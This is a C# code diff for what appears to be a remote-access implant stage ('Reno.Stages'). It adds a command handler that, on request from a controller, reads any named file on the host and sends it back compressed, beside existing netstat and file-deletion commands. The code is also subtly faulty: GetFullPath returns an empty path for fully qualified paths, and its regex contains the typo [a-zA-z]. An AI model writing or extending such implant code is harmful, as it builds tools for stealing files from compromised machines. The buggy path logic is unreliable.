@@ -86,6 +86,23 @@ namespace Reno.Stages
                     case CommChannel.UPLOAD:
                         break;
                     case CommChannel.DOWNLOAD:
+                        byte[] fileToDownload = channel.Decompress(channel.ReceiveBytes(header.DataLength));
+                        string fileDownload = GetFullPath(Encoding.UTF8.GetString(fileToDownload));
+                        Console.WriteLine("[*] Asked to download {0}", fileDownload);
+                        // Get the file and transmit
+                        if (File.Exists(fileDownload))
+                        {
+                            byte[] downloadBytes = File.ReadAllBytes(fileDownload);
+                            CommHeader h = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, downloadBytes.Length);
+                            channel.SendHeader(h);
+                            channel.SendBytes(channel.Compress(downloadBytes));
+                        }
+                        // Send error if the file doesnt exist
+                        else
+                        {
+                            CommHeader h = CreateHeader(header.Command, header.Compression, CommChannel.ERROR, header.Id, 0);
+                            channel.SendHeader(h);
+                        }
                         break;
                     case CommChannel.NETSTAT:
                         SendNetstat(header);
@@ -95,6 +112,18 @@ namespace Reno.Stages
                         break;
                 }
             }
+        }
+
+        private string GetFullPath(string s)
+        {
+            string path = "";
+            // Do some checking on the string - if the object is not fully qualified, make it
+            Regex fullPath = new Regex(@"^\\\\|^\\|^[a-zA-z]:\\");
+            if (!fullPath.IsMatch(s))
+            {
+                path = Path.Combine(pwd, Path.GetFileName(s));
+            }
+            return path;
         }
         /// <summary>
         /// Helper function to delete a file or directory on the host
